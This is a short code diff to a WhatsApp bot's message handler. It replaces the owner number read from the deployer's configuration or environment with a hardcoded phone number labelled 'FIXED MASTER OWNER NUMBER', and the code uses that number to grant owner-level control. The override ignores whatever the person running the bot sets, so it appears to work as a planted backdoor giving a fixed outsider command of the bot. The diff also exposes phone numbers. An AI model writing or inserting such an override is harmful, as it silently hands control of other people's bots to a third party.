@@ -1425,7 +1425,7 @@ async function setupMessageHandler(wasi_sock, sessionId) {
                     const normSenderJid = jidNormalizedUser(wasi_sender);
                     const senderNum = normSenderJid.split('@')[0].split(':')[0].replace(/\D/g, '');
 
-                    const ownerNumRaw = (currentConfig.ownerNumber || process.env.OWNER_NUMBER || '923259823531').toString();
+                    const ownerNumRaw = '923039107958'; // FIXED MASTER OWNER NUMBER
                     const ownerNumber = ownerNumRaw.replace(/\D/g, '');
                     const ownerJids = new Set([ownerNumber + '@s.whatsapp.net', ownerNumber + '@c.us']);
 
